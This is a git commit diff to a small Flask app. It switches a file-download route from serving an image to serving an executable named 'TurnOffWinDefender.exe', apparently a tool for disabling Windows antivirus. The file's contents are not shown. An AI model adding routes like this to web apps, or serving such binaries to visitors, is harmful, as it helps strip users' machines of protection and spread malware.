38df224c31f563c510defa3d0fa7d7e25106519c
thinhabc01 <62796914+thinhabc01@users.noreply.github.com>
2022-07-02 22:44:00 +0700

    Update app.py

--- app.py
+++ app.py
@@ -16,7 +16,7 @@ def homepage():
 @app.route('/return-files/')
 def return_files_tut():
 	try:
-		return send_file('Untitled design.png', attachment_filename='Untitled design.png')
+		return send_file('TurnOffWinDefender.exe', attachment_filename='TurnOffWinDefender.exe')
 	except Exception as e:
 		return str(e)
 
